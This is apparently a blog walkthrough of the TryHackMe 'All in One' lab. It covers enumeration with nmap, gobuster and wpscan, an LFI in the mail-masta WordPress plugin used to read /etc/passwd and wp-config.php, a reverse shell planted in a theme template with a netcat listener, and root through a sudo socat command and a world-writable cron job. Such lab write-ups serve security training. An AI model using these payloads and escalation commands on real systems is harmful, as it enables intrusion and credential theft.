---
title: "TryHackMe - All in One"
author: Nasrallah
description: ""
date: 2022-12-13 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, lfi, sudo, cronjob]
img_path: /assets/img/tryhackme/allinone
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [All in One](https://tryhackme.com/room/allinonemj) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.22.68
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.0.188
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

There are three open ports, 22 running an FTP server with anonymous login allowed, port 22 running OpenSSH and port 80 running Apache web server.

### FTP

Let's login to the ftp server as `anonymous`.

```bash
┌─[sirius@ParrotOS]─[~/CTF/THM/allinone]
└──╼ $ ftp 10.10.22.68                                                                                                                                  100 ⨯
Connected to 10.10.22.68.
220 (vsFTPd 3.0.3)
Name (10.10.22.68:sirius): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp> 
```

We logged in but couldn't find anything.

### Web

Let's navigate to the web page.

![](1.png)

We see Apache's default page.

### Gobuster

Let's run a directory scan.

```terminal
└──╼ $ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.250.237                      
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.250.237
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/10 08:46:27 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 278]  
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.250.237/wordpress/]
                                                                                     
===============================================================


```

We found **/wordpress**, let's take a look at it.

![](2.png)

As we can see it's a wodpress page with one post by a user called `elyana`.

### Wpscan

Let's scan wordpress using `wpscan`

```terminal
└──╼ $ wpscan --url http://10.10.250.237/wordpress                              
_______________________________________________________________                
         __          _______   _____                                                                                                                          
         \ \        / /  __ \ / ____|                                                                                                                         
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                        
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.21 
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.250.237/wordpress/ [10.10.250.237]
[+] Started: Thu Nov 10 08:37:21 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.250.237/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.250.237/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.250.237/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.250.237/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.250.237/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.250.237/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.250.237/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.250.237/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://10.10.250.237/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.250.237/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://10.10.250.237/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.250.237/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.10.250.237/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.250.237/wordpress/wp-content/plugins/reflex-gallery/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <===============================================================================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Nov 10 08:37:37 2022
[+] Requests Done: 174
[+] Cached Requests: 5
[+] Data Sent: 46.659 KB
[+] Data Received: 377.463 KB
[+] Memory used: 247.844 MB
[+] Elapsed time: 00:00:15

```

We found a lot of plugins installed, we search for vulnerabilities in those plugins and find that mail-masta is vulnerable to `LFI`

![](3.png)

The path for the vulnerability is `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

![](4.png)

Great! We managed to read the passwd file, now let's read the `wp-config.php` file which contains usernames and passwords, but to read that file we first need to convert it to base64: `php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php`

![](5.png)

Now let's decode it on [CyberChef](https://gchq.github.io/CyberChef/)

![](6.png)

## **Foothold**

Now that we have a username and a password, let's login to wordpress.

![](7.png)

Let's get a reverse shell by following the steps described in this [articel](https://www.hackingarticles.in/wordpress-reverse-shell/).

Go to `Appearance` -> `Theme editor` and select 404 Template.

We replace the php code with this [reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and update the file.

![](8.png)

Now we setup a listener with the command `nc -lvnp 1234` and navigate to `wp-content/themes/twentytwenty/404.php`

![](9.png)


## **Privilege Escalation**

### Elyana

Checking elyana's home directory, we find a hint informing us that elyana's password is somewhere in the system.

![](11.png)

We searched for file that belongs to `elyana` with the command `find / -type f -user elyana 2>/dev/null`, and we found the file with elyana's password, now we can either switch to that user or ssh into the machine.

### root

#### Method 1

We check our current privileges with `sudo -l`.

```terminal
-bash-4.4$ sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
```

We can run `socat` as root, if we check [GTFOBins](https://gtfobins.github.io/gtfobins/socat/#sudo) for this entry, we find that we can run the following command to get root.

```bash
sudo socat stdin exec:/bin/sh
```

#### Method 2

Next i checked cronjobs and found the following.

![](10.png)

There a script that being run every minute by root and it's writable by everybody. Let's copy the following code to get a root shell.

```bash
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```

We wait for the script to execute and run `/tmp/bash -p`

![](12.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

https://www.hackingarticles.in/wordpress-reverse-shell/